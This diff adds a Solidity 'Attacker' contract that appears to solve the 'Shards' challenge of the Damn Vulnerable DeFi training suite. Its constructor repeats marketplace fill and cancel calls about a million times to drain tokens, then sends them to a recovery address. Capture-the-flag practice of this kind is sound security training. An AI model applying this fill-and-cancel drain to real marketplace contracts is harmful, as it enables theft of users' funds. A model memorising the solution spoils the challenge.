@@ -1,0 +1,20 @@
+// SPDX-License-Identifier: MIT
+pragma solidity =0.8.25;
+
+import {
+    ShardsNFTMarketplace,
+    IShardsNFTMarketplace,
+    ShardsFeeVault,
+    DamnValuableToken,
+    DamnValuableNFT
+} from "../../src/shards/ShardsNFTMarketplace.sol";
+
+contract Attacker {
+    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
+        for (uint256 i=0; i < 1e6+1; i++) {
+            marketplace.fill(1, 1);
+            marketplace.cancel(1, i);
+        }
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+}
